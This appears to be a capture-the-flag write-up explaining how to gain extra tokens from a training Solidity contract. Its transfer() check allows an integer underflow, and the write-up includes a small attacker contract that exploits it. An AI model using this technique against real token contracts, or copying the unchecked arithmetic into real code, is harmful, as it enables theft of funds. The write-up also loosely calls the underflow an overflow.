The goal of this level is for us to hack the basic token contract given.

We are given 20 tokens to start with and will beat the level if somehow we manage to get hands on any additional tokens. Preferably a very large amount of tokens.

If we observe the function transfer()

```solidity
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

we can see that we can overflow the line 1 in the function by using `_value` > `balances[msg.sender]`
this way we can increase the `balances[_to]`

we just need to observe the console to see what values of `_value` will do the deed and send it with the below code

```solidity
    interface Token{
        function transfer(address _to,uint256 value) external returns(bool);
    }
    contract hackToken{
        Token token;
        constructor(address _player){
            token = Token(_player);
        }
        function _transfer(address to, uint256 value) public returns(bool){
            return token.transfer(to,value);
        }
    }
```
